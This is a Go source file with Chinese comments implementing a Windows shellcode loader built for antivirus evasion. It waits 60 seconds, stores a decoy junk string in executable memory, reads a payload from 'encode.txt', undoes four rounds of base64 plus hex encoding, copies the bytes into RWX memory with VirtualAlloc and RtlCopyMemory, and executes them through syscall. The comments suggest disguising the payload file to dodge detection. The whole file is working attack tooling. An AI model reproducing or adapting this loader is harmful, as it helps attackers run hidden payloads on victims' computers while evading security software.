package main

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"os"
	"syscall"
	"time"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")   //调用kernel32.dll
	ntdll         = syscall.MustLoadDLL("ntdll.dll")      //调用ntdll.dll
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc") //使用kernel32.dll调用ViretualAlloc函数
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")   //使用ntdll调用RtCopyMemory函数
)

func checkErr(err error) {
	if err != nil { // 如果内存调用出现错误，可以报出
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}

func Readcode() string {
	f, err := ioutil.ReadFile("encode.txt")
	//为我们需要加载的shellcode文件，这里可以使用其他格式的文件来进行混淆
	if err != nil {
		fmt.Println("read fail", err)
	}
	return string(f)
}

func Base64DecodeString(str string) string {
	resBytes, _ := base64.StdEncoding.DecodeString(str)
	return string(resBytes)
}

func main() {

	time.Sleep(60 * time.Second)

	// 内存加载shellcode前，先压入一段无关字符串用来混淆
	var c string = "sgamfygyjffqrqwxzcvzxbsdwdqbsdbgagqwQWRQW/.OAUSHCNIADOdjfqwSFADOQIWOIJOGWEMPOSDPOOPasffvaSFAsafwfYRinJD3124651612qwrE02e"

	// 调用VirtualAllo申请一块内存
	addr1, _, err := VirtualAlloc.Call(0, uintptr(len(c)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	//调用RtlCopyMemory加载进内存当中
	_, _, err = RtlCopyMemory.Call(addr1, (uintptr)(unsafe.Pointer(&c)), uintptr(len(c)/2))

	Str := Readcode()                     // 加载 shellcode
	deStrBytes := Base64DecodeString(Str) //  4次base64解码
	for i := 0; i < 3; i++ {
		deStrBytes = Base64DecodeString(deStrBytes)
	}
	shellcode, err := hex.DecodeString(deStrBytes)

	// 调用VirtualAllo申请一块内存
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}
	// 调用RtlCopyMemory加载进内存当中
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)/2))
	_, _, err = RtlCopyMemory.Call(addr+uintptr(len(shellcode)/2), (uintptr)(unsafe.Pointer(&shellcode[len(shellcode)/2])), uintptr(len(shellcode)/2))
	checkErr(err)

	//syscall来运行shellcode
	syscall.Syscall(addr, 0, 0, 0, 0)

}
